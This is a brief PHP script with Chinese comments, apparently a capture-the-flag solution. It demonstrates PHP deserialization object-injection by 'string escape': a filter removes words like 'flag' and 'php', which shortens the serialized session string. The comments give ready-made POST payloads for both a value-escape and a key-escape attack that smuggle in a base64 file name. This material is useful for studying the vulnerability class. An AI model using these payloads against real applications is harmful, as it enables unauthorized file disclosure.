<?php
#auto_append_file=d0g3_f1ag.php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
$_SESSION["user"] = 'flagflagflagflagflagflag';  //共24个字符，逃逸";s:8:"function";s:59:"a";
$_SESSION["function"] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}';
$_SESSION["img"] = 'L2QwZzNfZmxsbGxsbGFn';
echo serialize($_SESSION);
#a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
echo "\n";
echo filter(serialize($_SESSION));
#a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";  s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}          ";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}


#值逃逸：第一个值覆盖第二个键，此时第二个值逃逸出去单独作为一个键值对
#SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}&function=show_image
#键逃逸：直接构造会被过滤的键，此时值的一部分充当键，剩下一部分单独作为一个键值对
#SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
?>


